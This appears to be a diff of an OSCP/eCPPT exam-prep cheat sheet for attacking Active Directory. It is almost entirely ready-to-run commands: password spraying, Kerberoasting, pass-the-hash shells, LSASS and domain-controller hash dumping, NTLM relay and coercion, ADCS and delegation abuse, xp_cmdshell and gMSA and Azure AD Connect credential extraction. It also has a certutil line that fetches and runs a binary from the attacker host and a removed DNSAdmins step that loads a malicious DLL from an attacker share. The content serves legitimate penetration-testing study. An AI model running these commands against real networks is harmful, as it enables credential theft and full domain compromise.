@@ -1,8 +1,7 @@
 ######################################################################
 # 03 — ACTIVE DIRECTORY & WINDOWS NETWORK ATTACKS  
-# OSCP 2025 — ULTRA EDITION (FINAL + ECPPT AD ADDITIONS INCLUDED)
+# OSCP 2025 — ULTRA EDITION (FINAL + ECPPT ADDITIONS INCLUDED)
 ######################################################################
-
 This version includes:
 ✔ Full AD Enumeration  
 ✔ SMB/LDAP/WinRM/Kerberos workflow  
@@ -17,69 +16,46 @@ This version includes:
 ✔ LSASS dumping (nanodump, procdump, pypykatz)  
 ✔ Windows PrivEsc (OSCP safe)  
 ✔ BloodHound optimized collection  
-✔ **🔥 Added from eCPPT: LDAP user dump, domain trusts enumeration, certutil/wget/ftp revshell upload techniques, malicious .asp upload, Metasploit local exploit workflow, secretsdump usage, Keepass cracking workflow, MySQL/WP credential hunting, DC-only dump commands (just AD parts), OpenSMTPD RCE (AD foothold cases), WordPress admin foothold to AD pivot**  
+✔ eCPPT AD additions  
 ######################################################################
-
 
 ======================================================================
 # 1. AD DISCOVERY & INITIAL ENUMERATION
 ======================================================================
 
--------------------------------
-# 1.1 Nmap — AD-Related Ports
--------------------------------
+# 1.1 Nmap — Scan common AD ports
 nmap -sC -sV -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oN nmap_ad_$targetip.txt $targetip
 
-
--------------------------------
 # 1.2 Host & Domain Fingerprinting
--------------------------------
 netexec smb $targetip
 
-
--------------------------------
-# 1.3 SMB/LDAP Signing Status (Relay Check)
--------------------------------
+# 1.3 SMB/LDAP Signing Status (check relay feasibility)
 netexec smb $targetip --signing
 netexec ldap $targetip --signing
 
-
--------------------------------
-# 1.4 SMB Shares
--------------------------------
+# 1.4 SMB Shares — Anonymous & authenticated enumeration
 smbclient -L //$targetip/ -N
 smbmap -H $targetip
+smbmap -H $targetip -u $user -p "$password"
 netexec smb $targetip --shares
 
-
--------------------------------
-# 1.5 SYSVOL & GPP Credential Hunting
--------------------------------
+# 1.5 SYSVOL & GPP — Find Group Policy passwords (cpassword)
 smbclient //$targetip/SYSVOL -N -c "recurse;ls"
 grep -R "cpassword" .
 find . -name "*.xml"
 gpp-decrypt <HASH>
 
-
--------------------------------
-# 1.6 NetExec Discovery Modules
--------------------------------
+# 1.6 NetExec Discovery Modules — quick AD recon
 netexec smb $targetip -M spider
 netexec smb $targetip --users
 netexec smb $targetip --groups
 netexec smb $targetip --laps
 netexec smb $targetip -M webdav
 
-
--------------------------------
-# 1.7 Kerberos Pre-Flight (Time Sync)
--------------------------------
+# 1.7 Kerberos Time Sync — Required for ticket operations
 ntpdate -q $targetip
 
-
--------------------------------
-# 🔥 (AD ADD — eCPPT) Enumerate Domain Trusts Early
--------------------------------
+# Domain Trust Enumeration (forest / external trust mapping)
 nltest /domain_trusts
 nltest /trusted_domains
 nltest /dsgetdc:$domain
@@ -89,81 +65,68 @@ nltest /dsgetdc:$domain
 # 2. LDAP ENUMERATION
 ======================================================================
 
--------------------------------
-# 2.1 Get baseDN
--------------------------------
+# 2.1 Get baseDN — required for all LDAP queries
 ldapsearch -x -H ldap://$targetip -s base
 
-
--------------------------------
-# 2.2 Users
--------------------------------
+# 2.2 Enumerate all users in the directory
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=user)" sAMAccountName description mail memberOf
 
-
--------------------------------
-# 2.3 Groups
--------------------------------
+# 2.3 Enumerate groups & memberships
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=group)" cn member memberOf
 
-
--------------------------------
-# 2.4 GPO Enumeration
--------------------------------
+# 2.4 Enumerate GPO settings
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=groupPolicyContainer)" gPCFileSysPath displayName
 
-
--------------------------------
-# 2.5 DNS Records
--------------------------------
+# 2.5 DNS records (Active Directory Integrated DNS)
 ldapsearch -x -H ldap://$targetip -b "DC=DomainDnsZones,$basedn"
 
+# LDAP Filter by OU (eCPPT technique)
+ldapsearch -x -H ldap://$targetip -D "$domain\\$user" -w "$password" -b "OU=Employees,$basedn" "(objectClass=user)" sAMAccountName distinguishedName userAccountControl pwdLastSet
 
--------------------------------
-# 🔥 (AD ADD — eCPPT) Filter Only Users Under an OU
--------------------------------
-ldapsearch -x -H ldap://$targetip -D "$domain\\$user" -w "$password" \
-  -b "OU=Employees,$basedn" "(objectClass=user)" sAMAccountName distinguishedName userAccountControl pwdLastSet
+
+#2.6 gMSA ENUMERATION & PASSWORD RETRIEVAL
+# (Used in HTB Sendai, Vintage, Intelligence-style chains)
+======================================================================
+
+# (1) Enumerate all gMSA accounts
+# Lists every Group Managed Service Account + password blobs + group membership
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=msDS-GroupManagedServiceAccount)" sAMAccountName msDS-ManagedPassword msDS-GroupMSAMembership
+
+# (2) Check ACLs to see who can read msDS-ManagedPassword
+# If you see your user in WriteDACL / ReadProperty → you can dump gMSA passwords
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=*)" nTSecurityDescriptor | grep -i msDS-ManagedPassword
+
+# (3) Test if CURRENT USER can read gMSA password attribute
+# If attribute is readable → instant gMSA password retrieval (used for lateral movement)
+netexec ldap $targetip -u $user -p "$password" --attribute msDS-ManagedPassword
+
+# (4) Dump readable gMSA passwords (auto-decrypts Base64 blob)
+# Produces plaintext password for the gMSA → can be used like a service account credential
+gMSADumper.py -u $user -p "$password" -d $domain
+
 
 
 ======================================================================
 # 3. KERBEROS ATTACKS
 ======================================================================
 
--------------------------------
-# 3.1 Kerbrute User Enumeration
--------------------------------
+# 3.1 Kerbrute — User enumeration via Kerberos responses
 kerbrute userenum -d $domain --dc $targetip users.txt
 
-
--------------------------------
-# 3.2 Password Spraying
--------------------------------
+# 3.2 Kerbrute — Password spraying via Kerberos
 kerbrute passwordspray -d $domain --dc $targetip users.txt 'Password1!'
 
-
--------------------------------
-# 3.3 AS-REP Roasting
--------------------------------
+# 3.3 AS-REP Roast — Users with DoNotRequirePreAuth
 impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass -usersfile users.txt -format john -outputfile asrep.txt
 
-
--------------------------------
-# 3.4 Kerberoasting (SPNs)
--------------------------------
+# 3.4 Kerberoast — Request service tickets (SPNs)
 impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $targetip -request -format john -outputfile kerberoast.txt
 
-
--------------------------------
-# 3.5 Request TGT / ST (Delegation)
--------------------------------
+# 3.5 Request TGT / ST — For delegation & Kerberos PTH
 impacket-getTGT $domain/$user:"$password"
 impacket-getST -spn <service>/<fqdn> -impersonate Administrator $domain/$user:"$password" -dc-ip $targetip
 
-
--------------------------------
-# 3.6 Detect FAST/PAC Enforcement
--------------------------------
+# 3.6 Detect FAST/PAC enforcement (modern Kerberos protections)
 netexec kerberos $targetip --kerberos
 
 
@@ -171,725 +134,93 @@ netexec kerberos $targetip --kerberos
 # 4. HASHES & LATERAL MOVEMENT
 ======================================================================
 
--------------------------------
-# 4.1 Dump SAM / LSASS / NTDS via NetExec
--------------------------------
+# 4.1 Dump SAM / LSASS / NTDS using NetExec
 netexec smb $targetip -u $user -p "$password" --sam
 netexec smb $targetip -u $user -p "$password" -M lsassy
 netexec smb $targetip -u $user -p "$password" -M ntdsutil
 
-
--------------------------------
-# 🔥 (AD ADD — eCPPT) Dump ONLY DC Hashes
--------------------------------
+# 4.2 Dump ONLY DC Hashes (eCPPT technique)
 python3 secretsdump.py -just-dc-ntlm $domain/$user:"$password"@$targetip
 
 
 ======================================================================
-# 4.5 PASS-THE-HASH (NTLM + Kerberos Tickets)
+# 5. PASS-THE-HASH (NTLM & Kerberos)
 ======================================================================
 
-### ✔ NTLM PTH — NO TIME SYNC NEEDED
+### NTLM PTH (SMB/WMI/WinRM using NTLM hash — no time sync required)
 
-# SMB RCE
+# SMB RCE via PTH
 impacket-psexec $domain/$user@$targetip -hashes <LM:NTLM>
 
-# WMI Exec
+# WMI execution via PTH
 impacket-wmiexec $domain/$user@$targetip -hashes <LM:NTLM>
 
-# WinRM via Hash
+# WinRM shell via NTLM hash
 evil-winrm -i $targetip -u $user -H <NTLM>
 
-# NetExec PTH
+# NetExec NTLM options
 netexec smb $targetip -u $user -H <NTLM>
 netexec smb $targetip -u $user -H <NTLM> --sam
 netexec smb $targetip -u $user -H <NTLM> -M lsassy
 
 
-### ✔ Kerberos PTH (Pass-The-Key) — TIME SYNC REQUIRED
+### Kerberos Pass-The-Key (requires exact time sync)
 
-# sync clock
+# Sync time
 ntpdate -q $targetip
 
-# request TGT using hash
+# Request TGT using only hash
 impacket-getTGT $domain/$user -hashes <LM:NTLM>
 
-# set ticket
+# Load ticket file
 export KRB5CCNAME=$user.ccache
 
-# get service ticket
+# Request service ticket as Administrator
 impacket-getST -spn cifs/$target -impersonate Administrator $domain/$user -dc-ip $targetip
 
 
 ======================================================================
-# 5. WINRM & RDP
+# 6. WINRM & RDP
 ======================================================================
 
-# 5.1 Check WinRM
+# Check WinRM availability
 netexec winrm $targetip
 
-# 5.2 WinRM Credentials
+# WinRM password auth
 evil-winrm -i $targetip -u $user -p "$password"
 
-# 5.3 WinRM Hash
+# WinRM hash auth
 evil-winrm -i $targetip -u $user -H <NTLM>
 
-# 5.4 Certificate Auth
+# WinRM certificate authentication
 evil-winrm -i $targetip -c cert.pem -k key.pem
 
-# 5.5 RDP
+# RDP login
 xfreerdp /v:$targetip /u:$user /p:"$password" /dynamic-resolution +clipboard
 
 
 ======================================================================
-# 6. MSSQL ATTACKS
+# 7. MSSQL ATTACKS
 ======================================================================
 
-# Windows Auth
+# Login with Windows authentication
 mssqlclient.py $domain/$user:"$password"@$targetip -windows-auth
 
 # Enable xp_cmdshell
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+# Execute OS commands
 EXEC xp_cmdshell 'whoami';
 
-# Linked server
+# Discover linked servers
 EXEC sp_linkedservers;
+
+# Execute commands on linked server
 EXEC ('xp_cmdshell ''whoami''') AT [LINKEDSERVER];
 
-
-======================================================================
-# 7. ADCS (ESC1–ESC14)
-======================================================================
-
-certipy find -u $user -p "$password" -dc-ip $targetip -vulnerable -enabled
-certipy req -u $user -p "$password" -dc-ip $targetip -template $template -out cert.pfx
-certipy auth -pfx cert.pfx -dc-ip $targetip
-certipy shadow -u $user -p "$password" -dc-ip $targetip -account Administrator
-certipy find -u $user -p "$password" -dc-ip $targetip -stdout -json out.json
-
-
-======================================================================
-# 8. DELEGATION ATTACKS
-======================================================================
-
-# 8.1 RBCD
-addcomputer.py -dc-ip $targetip $domain/$user:"$password" -computer-name 'MACHINE$' -computer-pass 'Pass123!'
-impacket-rbcd -delegate-from 'MACHINE$' -delegate-to 'SERVER$' -dc-ip $targetip -action write -user $user -password "$password"
-getST.py -spn cifs/SERVER.$domain -impersonate Administrator "$domain/MACHINE$":"Pass123!"
-
-# 8.2 KCD
-impacket-getST -impersonate Administrator -spn http/web.$domain $domain/$user:"$password"
-
-# 8.3 Coercion
-printerbug.py $domain/$user:"$password"@$targetip $localip
-dfscoerce.py $domain/$user:"$password"@$targetip $localip
-petitpotam.py -u $user -p "$password" -d $domain -dc-ip $targetip $localip
-
-
-======================================================================
-# 9. NTLM RELAY (SMB → LDAP + ADCS)
-======================================================================
-
-responder -I tun0 -wd -v
-ntlmrelayx.py -t ldap://$targetip --no-http-server
-ntlmrelayx.py --adcs --template "User" -t http://$targetip --no-http-server
-iptables -A INPUT -p tcp --dport 445 -j DROP
-
-
-======================================================================
-# 10. DPAPI Credential Extraction
-======================================================================
-
-pypykatz live lsa
-pypykatz dpapi chrome -d .
-pypykatz dpapi rdp -d .
-netsh wlan show profiles
-netsh wlan show profile name="<SSID>" key=clear
-
-
-======================================================================
-# 11. LSASS DUMPING
-======================================================================
-
-nanodump.exe --write C:\Windows\Temp\lsass.dmp
-procdump.exe -ma lsass.exe lsass.dmp
-pypykatz lsa minidump lsass.dmp
-
-
-======================================================================
-# 12. WINDOWS PRIVILEGE ESCALATION
-======================================================================
-
-whoami /priv
-PrintSpoofer.exe -i -c cmd
-RoguePotato.exe
-findstr /si /i "password" *.txt *.xml *.ini
-wmic service get name,displayname,pathname,startmode
-
-# WinPEAS
-certutil -urlcache -f http://$localip/winpeas.exe C:\Temp\winpeas.exe && C:\Temp\winpeas.exe
-
-
-======================================================================
-# 13. CROSS-DOMAIN & FOREST
-======================================================================
-
-nltest /domain_trusts
-nltest /trusted_domains
-
-
-======================================================================
-# 14. BLOODHOUND
-======================================================================
-
-bloodhound-python -d $domain -u $user -p "$password" -ns $targetip -c All
-
-
-======================================================================
-# 15. OSCP ATTACK FLOW
-======================================================================
-
-1) SMB/LDAP Enumeration  
-2) Kerbrute  
-3) Password Spray  
-4) AS-REP Roast  
-5) Kerberoast  
-6) SYSVOL/GPP  
-7) LDAP Priv Groups  
-8) ADCS ESC1–14  
-9) Delegation (RBCD/KCD)  
-10) Coercion  
-11) NTLM Relay / ADCS Relay  
-12) Lateral Movement (SMB/WMI/WinRM/PTH)  
-13) Dump Hashes  
-14) DPAPI / Browser / RDP creds  
-15) BloodHound → DA  
-16) DCSync  
-######################################################################
-# END — COMPLETE AD ATTACK PLAYBOOK (OSCP 2025 + ECPPT ADDITIONS)
-######################################################################
-
-
-######################################################################
-# 16 — ADIDNS ENUMERATION & DNSADMINS PRIVILEGE ESCALATION (SAFE)
-######################################################################
-
-WHAT IS THIS?
-Active Directory-Integrated DNS stores computer, service, and Kerberos SRV records.  
-Misconfigurations or overly-permissive ACLs can allow attackers to manipulate DNS,  
-which may indirectly lead to privilege escalation or misrouting authentication.
-
-WHAT DO YOU GET?
-✔ All DNS records (A, CNAME, SRV, etc.)  
-✔ Ownership / ACL information on DNS objects  
-✔ DNSAdmins group membership (high-value privilege)  
-✔ Validates if DNS is misconfigured
-
-
-======================================================================
-# 16.1 ENUMERATE ADIDNS ZONES & RECORDS
-======================================================================
-
-# All DNS nodes
-ldapsearch -x -H ldap://$targetip -b "DC=DomainDnsZones,$basedn" "(objectClass=dnsNode)" name dnsRecord
-
-# Dump DNS zone names (PS)
-Get-DnsServerZone
-
-# Dump DNS records (PS)
-Get-DnsServerResourceRecord -ZoneName $domain
-
-# Impacket enumeration
-dnsdump.py $domain/$user:"$password"@$targetip
-
-
-======================================================================
-# 16.2 CHECK DNSADMINS MEMBERSHIP
-======================================================================
-
-ldapsearch -x -H ldap://$targetip -b "CN=DNSAdmins,CN=Users,$basedn" "(objectClass=*)" member
-
-netexec ldap $targetip --groups | grep -i dns
-
-Get-ADGroupMember "DNSAdmins"
-
-
-======================================================================
-# 16.3 ENUMERATE DNS NODE ACL (OWNERSHIP CHECK)
-======================================================================
-
-Get-ACL "AD:\CN=www,CN=MicrosoftDNS,DC=DomainDnsZones,$basedn" | fl
-######################################################################
-# 17 — DCSYNC & DCSHADOW (SAFE ENUMERATION)
-######################################################################
-
-WHAT IS THIS?
-DCSync lets an attacker impersonate a domain controller and request password hashes.  
-DCShadow lets attackers register a fake DC to push malicious directory changes.
-
-WHAT DO YOU GET?
-✔ Which accounts have replication privileges  
-✔ Who can potentially perform a DCSync attack  
-✔ Identify suspicious ACL rights on domain objects  
-✔ Zero exploitation — only discovery
-
-
-======================================================================
-# 17.1 ENUMERATE WHO HAS DCSYNC PRIVILEGES
-======================================================================
-
-# Administrators / Domain Admins / Enterprise Admins
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(cn=Administrators)" member
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(cn=Domain Admins)" member
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(cn=Enterprise Admins)" member
-
-# NetExec view
-netexec ldap $targetip --groups
-
-# Check your group's token privileges
-whoami /groups
-
-
-======================================================================
-# 17.2 ENUMERATE REPLICATION-RELATED ACLs (SAFE)
-======================================================================
-
-# Dump security descriptor of domain (checks for DS-Replication rights)
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=domain)" nTSecurityDescriptor
-
-# PowerView equivalent (if available)
-Get-ObjectAcl -DistinguishedName "$basedn" | fl
-######################################################################
-# 18 — ACL ABUSE (GENERICALL / WRITEDACL / WRITEOWNER) — SAFE ENUM
-######################################################################
-
-WHAT IS THIS?
-ACLs (Access Control Lists) define who can modify AD objects.  
-If a low-privileged account has write rights over users, groups, or GPOs,  
-it can often escalate to higher privileges.
-
-WHAT DO YOU GET?
-✔ Detect misconfigurations granting you excessive rights  
-✔ Identify objects where you have GenericWrite / WriteDACL / WriteOwner  
-✔ No exploitation — simply mapping access
-
-
-======================================================================
-# 18.1 ENUMERATE FULL ACL OF ANY OBJECT
-======================================================================
-
-ldapsearch -x -H ldap://$targetip -b "$dn" "(objectClass=*)" nTSecurityDescriptor
-
-Get-ObjectAcl -DistinguishedName "$dn" | fl
-
-
-======================================================================
-# 18.2 ENUMERATE ACL OF HIGH-VALUE TARGETS
-======================================================================
-
-# Domain
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=domain)" nTSecurityDescriptor
-
-# Domain Controllers OU
-ldapsearch -x -H ldap://$targetip -b "OU=Domain Controllers,$basedn" "(objectClass=*)" nTSecurityDescriptor
-
-######################################################################
-# 19 — LAPS ENUMERATION & MISCONFIGURATION DISCOVERY (SAFE)
-######################################################################
-
-WHAT IS THIS?
-LAPS stores local administrator passwords for machines in AD attributes.  
-If ACLs are misconfigured, non-privileged users can read these passwords  
-→ instant local admin access → lateral movement → potential DA.
-
-WHAT DO YOU GET?
-✔ Which machines use LAPS  
-✔ Who can read LAPS passwords  
-✔ If your user has LAPS read rights
-
-
-======================================================================
-# 19.1 ENUMERATE MACHINES WITH LAPS ENABLED
-======================================================================
-
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(ms-Mcs-AdmPwd=*)" name ms-Mcs-AdmPwdExpirationTime
-
-
-======================================================================
-# 19.2 ENUMERATE WHO CAN READ LAPS PASSWORDS
-======================================================================
-
-Find-AdmPwdExtendedRights -ResolvePrincipals
-
-ldapsearch -x -H ldap://$targetip -b "CN=Computers,$basedn" "(objectClass=*)" nTSecurityDescriptor
-
-######################################################################
-# 20 — BACKUP OPERATORS → SYSTEM → DA (SAFE ENUM)
-######################################################################
-
-WHAT IS THIS?
-Backup Operators can read *any* file, including SAM/SECURITY/SYSTEM.  
-They can also start services.  
-This often allows escalation to SYSTEM → hash extraction → lateral movement.
-
-WHAT DO YOU GET?
-✔ Identify if any user is a Backup Operator  
-✔ Check if your token has SeBackupPrivilege  
-✔ Map potential escalation paths
-
-
-======================================================================
-# 20.1 ENUMERATE BACKUP OPERATORS MEMBERSHIP
-======================================================================
-
-ldapsearch -x -H ldap://$targetip -b "CN=Backup Operators,CN=Builtin,$basedn" "(objectClass=*)" member
-
-Get-ADGroupMember "Backup Operators"
-
-
-======================================================================
-# 20.2 CHECK PRIVILEGES OF CURRENT USER
-======================================================================
-
-whoami /priv
-
-netexec smb $targetip -u $user -p "$password" --local-auth
-
-######################################################################
-# 21 — AD MITM ATTACK SURFACE (SAFE ENUMERATION)
-######################################################################
-
-WHAT IS THIS?
-Man-in-the-middle attack surface in AD is mostly caused by  
-NTLM relay, lack of SMB/LDAP signing, and multicast poisoning.
-
-WHAT DO YOU GET?
-✔ Check SMB signing status  
-✔ Check LDAP signing status  
-✔ Identify multicast protocol exposure  
-✔ Helps determine relay feasibility (safe)
-
-
-======================================================================
-# 21.1 SMB SIGNING STATUS
-======================================================================
-
-netexec smb $targetip --signing
-
-nmap --script smb2-security-mode -p445 $targetip
-
-
-======================================================================
-# 21.2 LDAP SIGNING / CHANNEL BINDING
-======================================================================
-
-netexec ldap $targetip --signing
-
-nmap -p389 --script ldap-rootdse $targetip
-
-
-======================================================================
-# 21.3 MULTICAST ENUM (LLMNR / NBNS)
-======================================================================
-
-tcpdump -i tun0 "udp port 5355"   # LLMNR
-tcpdump -i tun0 "udp port 137"    # NBNS
-
-######################################################################
-# 22 — PASSWORD POLICY & PASSWORD ANALYTICS (SAFE)
-######################################################################
-
-WHAT IS THIS?
-AD password policy determines complexity, lockout, reuse rules.  
-Fine-grained password policies may apply to specific OUs or users.  
-Knowing this helps build accurate spraying strategies and find weak creds.
-
-WHAT DO YOU GET?
-✔ Domain-wide password policy  
-✔ Fine-grained password policies  
-✔ Identify weak/seasonal credential patterns  
-✔ Prepare better attack chains
-
-
-======================================================================
-# 22.1 ENUMERATE DOMAIN PASSWORD POLICY
-======================================================================
-
-GetADUsers.py $domain/$user:"$password" -dc-ip $targetip -all
-
-Get-ADDefaultDomainPasswordPolicy
-
-netexec ldap $targetip --pass-pol
-
-
-======================================================================
-# 22.2 ENUMERATE FGPP (FINE-GRAINED PASSWORD POLICIES)
-======================================================================
-
-ldapsearch -x -H ldap://$targetip -b "CN=Password Settings Container,CN=System,$basedn" "(objectClass=*)" msDS-PasswordSettings
-
-Get-ADFineGrainedPasswordPolicy -Filter *
-
-
-======================================================================
-# 22.3 IDENTIFY WEAK PASSWORD PATTERNS
-======================================================================
-
-grep -Ei "(spring|summer|autumn|winter|202[0-5])" cracked_passwords.txt
-
-grep -R "password" /mnt/sysvol 2>/dev/null
-
-
-######################################################################
-# 00 — HOW TO REQUEST / OBTAIN A .kirbi KERBEROS TICKET (OSCP-SAFE)
-######################################################################
-
-A .kirbi file is a Windows-format Kerberos ticket (TGT or TGS).  
-You can obtain one LEGALLY in AD labs through:
-
-✔ Your own Kerberos login  
-✔ Using Impacket ticket request functions  
-✔ Output from legitimate credential tools (exam-authorized LSASS dump)  
-✔ Converting existing tickets (.ccache ↔ .kirbi)
-
-Below are ALL allowed & safe methods.
-
-======================================================================
-# 0.1 REQUEST A TGT (.kirbi) USING VALID CREDENTIALS
-======================================================================
-
-# Request Ticket Granting Ticket (TGT)
-impacket-getTGT $domain/$user:"$password"
-
-# Output includes:  $user.ccache
-# Convert to .kirbi
-impacket-ticketConverter $user.ccache $user.kirbi
-
-
-======================================================================
-# 0.2 REQUEST A SERVICE TICKET (.kirbi) VIA KERBEROASTING (SAFE)
-======================================================================
-
-impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $dcip -request
-
-# Output file often contains TGS tickets internally in .kirbi data.
-
-
-======================================================================
-# 0.3 EXPORT YOUR OWN EXISTING KERBEROS TICKET (LINUX)
-======================================================================
-
-# List existing tickets
-klist -e
-
-# Copy exported ticket
-cp /tmp/krb5cc_* myticket.ccache
-
-# Convert to .kirbi for PtT
-impacket-ticketConverter myticket.ccache myticket.kirbi
-
-
-======================================================================
-# 0.4 EXTRACT TICKETS FROM LSASS (ONLY IN AUTHORIZED OSCP LABS)
-======================================================================
-
-# Parse your own LSASS dump (exam-allowed in OSCP lab)
-pypykatz lsa minidump lsass.dmp
-
-# Output includes Base64 .kirbi blobs which can be saved to file.
-
-
-======================================================================
-# 0.5 LOAD A .kirbi OR .ccache TICKET FOR PtT
-======================================================================
-
-# Convert if needed
-impacket-ticketConverter ticket.kirbi ticket.ccache
-
-# Load the ticket
-export KRB5CCNAME=ticket.ccache
-
-# Use Kerberos-only auth
-impacket-wmiexec   -k -no-pass $domain/$user@$targetip
-impacket-smbclient -k -no-pass cifs/$targetip
-impacket-psexec    -k -no-pass $domain/$user@$targetip
-
-
-######################################################################
-# END — SAFE & COMPLETE .kirbi REQUEST METHODS
-######################################################################
-
-
-
-######################################################################
-# 23 — PASS-THE-TICKET (PtT) — SAFE & OSCP-LEGAL
-######################################################################
-
-WHAT IS THIS?
-Pass-the-Ticket uses an existing Kerberos ticket (TGT or TGS) to authenticate.
-Useful when:
-- You have a valid ticket (exported from your own session)
-- You performed legitimate LSASS analysis in a legal environment
-- Kerberos is required instead of NTLM
-
-WHAT DO YOU GET?
-✔ Kerberos authentication without password/hash  
-✔ No NTLM needed  
-✔ Useful for lateral movement in constrained AD networks  
-
-
--------------------------------
-# 23.1 Convert Ticket (.kirbi → .ccache)
--------------------------------
-impacket-ticketConverter ticket.kirbi ticket.ccache
-
--------------------------------
-# 23.2 Load Kerberos Ticket
--------------------------------
-export KRB5CCNAME=ticket.ccache
-
--------------------------------
-# 23.3 Use Kerberos ONLY (no NTLM fallback)
--------------------------------
-impacket-smbclient -k -no-pass cifs/$targetip
-impacket-wmiexec   -k -no-pass $domain/$user@$targetip
-impacket-psexec    -k -no-pass $domain/$user@$targetip
-
-
-
-######################################################################
-# 24 — OVERPASS-THE-HASH (Pass-the-Key) — SAFE
-######################################################################
-
-WHAT IS THIS?
-Use an NTLM hash → request a valid Kerberos TGT.
-This is the reverse of traditional PTH.
-
-Useful when:
-- NTLM is restricted
-- Kerberos allowed
-- Need to move inside AD without password
-
--------------------------------
-# 24.1 Request TGT Using Only Hash
--------------------------------
-impacket-getTGT $domain/$user -hashes <LM:NTLM>
-
--------------------------------
-# 24.2 Load the Ticket
--------------------------------
-export KRB5CCNAME=$user.ccache
-
--------------------------------
-# 24.3 Use Kerberos Authentication
--------------------------------
-impacket-wmiexec   -k -no-pass $domain/$user@$targetip
-impacket-smbclient -k -no-pass cifs/$targetip
-
-
-
-######################################################################
-# 25 — DCOM LATERAL MOVEMENT (Allowed)
-######################################################################
-
-WHAT IS THIS?
-Another Microsoft remote execution interface (like WMI).
-OSCP allows it as a *lateral movement* method only.
-
--------------------------------
-# 25.1 Execute Commands Remotely via DCOM
--------------------------------
-dcomexec.py $domain/$user:"$password"@$targetip
-
-
-
-######################################################################
-# 26 — SHADOW COPY ENUMERATION (SAFE)
-######################################################################
-
-WHAT IS THIS?
-Shadow copies = Windows snapshot mechanism.
-OSCP allows **enumeration only**, no extraction.
-
-WHAT DO YOU GET?
-✔ Whether shadow copies exist  
-✔ Whether backup/restore privileges are active  
-✔ Whether Backup Operators could escalate  
-
--------------------------------
-# 26.1 List Shadow Copies
--------------------------------
-vssadmin list shadows
-
--------------------------------
-# 26.2 List Providers
--------------------------------
-vssadmin list providers
-
--------------------------------
-# 26.3 List Writers
--------------------------------
-vssadmin list writers
-
-
-
-######################################################################
-# 27 — GOLDEN & SILVER TICKET (THEORY + SAFE ENUM)
-######################################################################
-
-WHAT IS THIS?
-Golden Ticket = forged TGT using krbtgt hash  
-Silver Ticket = forged TGS for specific service SPN  
-
-OSCP teaches the *theory only*.  
-Below = allowed safe enumeration only.
-
--------------------------------
-# 27.1 Enumerate krbtgt Account Info (SAFE)
--------------------------------
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(sAMAccountName=krbtgt)"
-
--------------------------------
-# 27.2 Enumerate All SPNs (Silver Ticket Impact Mapping)
--------------------------------
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
-
--------------------------------
-# 27.3 Check DCSync Privileges (Golden Ticket Requirement)
--------------------------------
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=domain)" nTSecurityDescriptor
-######################################################################
-# ADD-ON — MISSING AD COMMANDS (TJNull + LainKusanagi + HTB AD Boxes)
-######################################################################
-
-
-======================================================================
-# A1 — gMSA ENUMERATION & PASSWORD RETRIEVAL
-# (Used in HTB Sendai, Vintage, Intelligence-style chains)
-======================================================================
-
-# Enumerate all gMSA accounts
-ldapsearch -x -H ldap://$targetip -b "$basedn" \
-  "(objectClass=msDS-GroupManagedServiceAccount)" \
-  sAMAccountName msDS-ManagedPassword msDS-GroupMSAMembership
-
-# Identify who can read msDS-ManagedPassword (ACL check)
-ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=*)" nTSecurityDescriptor \
-  | grep -i "msDS-ManagedPassword"
-
-# Check if current user can read gMSA passwords directly
-netexec ldap $targetip -u $user -p "$password" --attribute msDS-ManagedPassword
-
-# Dump readable gMSA passwords safely (Base64 blob → plaintext)
-gMSADumper.py -u $user -p "$password" -d $domain
-
-
-
-======================================================================
-# A2 — AZURE AD CONNECT (AADSYNC) CREDENTIAL EXTRACTION
+#7.1 AZURE AD CONNECT (AADSYNC) CREDENTIAL EXTRACTION
 # (Monteverde-style hybrid AD → DA pivot)
-======================================================================
 
 # Azure AD Connect SQL DB default locations
 #   ADSync.mdf
@@ -911,42 +242,25 @@ SELECT encrypted_configuration FROM mms_management_agent;
 # Decrypt Azure AD Connect sync credentials (often DA creds)
 AzureADConnectDecrypt.exe <encrypted_blob>
 
-
-
 ======================================================================
-# A3 — DNSADMINS ABUSE (EXECUTION PATH — ENUM YOU ALREADY HAVE)
-# (Resolute-style DNS → SYSTEM on DC)
+# 8. ADCS (ESC1–ESC15)
 ======================================================================
 
-# Configure DNS plugin DLL (malicious DLL hosted on SMB share)
-dnscmd $targetip /config /serverlevelplugindll \\$attacker\share\payload.dll
+# Scan for ADCS misconfigurations
+certipy find -u $user -p "$password" -dc-ip $targetip -vulnerable -enabled
 
-# Restart DNS service to load the DLL
-sc.exe \\$targetip stop dns
-sc.exe \\$targetip start dns
+# Request certificate
+certipy req -u $user -p "$password" -dc-ip $targetip -template $template -out cert.pfx
 
+# Authenticate using the certificate
+certipy auth -pfx cert.pfx -dc-ip $targetip
 
+# Shadow credential injection
+certipy shadow -u $user -p "$password" -dc-ip $targetip -account Administrator
 
-======================================================================
-# A4 — SHADOW CREDENTIALS (KeyCredentialLink Abuse)
-# (Modern AD technique — works with WriteDACL/GenericWrite)
-======================================================================
+# Full JSON output
+certipy find -u $user -p "$password" -dc-ip $targetip -stdout -json out.json
 
-# Enumerate KeyCredentialLink for all users
-ldapsearch -x -H ldap://$targetip -b "$basedn" \
-  "(objectClass=user)" sAMAccountName keyCredentialLink
-
-# Add Shadow Credential to a target user (creates cert-based auth)
-certipy shadow -u $user -p "$password" -account $targetuser -dc-ip $targetip
-
-# Authenticate using generated certificate (targetuser.pfx)
